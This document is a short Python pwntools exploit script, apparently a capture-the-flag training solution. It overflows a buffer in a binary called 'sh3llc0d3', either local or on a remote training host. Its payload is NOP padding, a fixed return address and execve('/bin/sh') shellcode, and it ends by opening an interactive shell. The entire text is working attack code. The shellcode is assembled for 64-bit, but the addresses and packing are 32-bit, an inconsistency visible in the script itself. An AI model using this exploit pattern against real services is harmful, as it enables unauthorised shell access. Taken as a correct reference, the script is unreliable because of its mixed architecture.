#!/usr/bin/env python3

import sys
from pwn import *
from pwn import p32

if "--remote" in sys.argv:
    p = remote("bin.training.jinblack.it", 2002)
else:
    p = process("./sh3llc0d3")

if "--debug" in sys.argv:
    context.terminal = ["terminator", "-e"]
    gdb.attach(p, """
    b *0x0804926b
    """)

shellcode = asm("""
mov rdi, 0x68732f6e69622f
push rdi    
mov rdi, rsp          

mov rax, 0x3b
mov rsi, 0
mov rdx, 0
syscall
""", arch='amd64')

print(shellcode)

payload = shellcode
payload = payload.ljust(208 + 4, b"\x90")
payload += p32(0x0804c060 + 8)
payload = payload.ljust(1000, b"\x90")

p.recvuntil(b"What is your name?\n")
p.sendline(payload)
p.interactive()
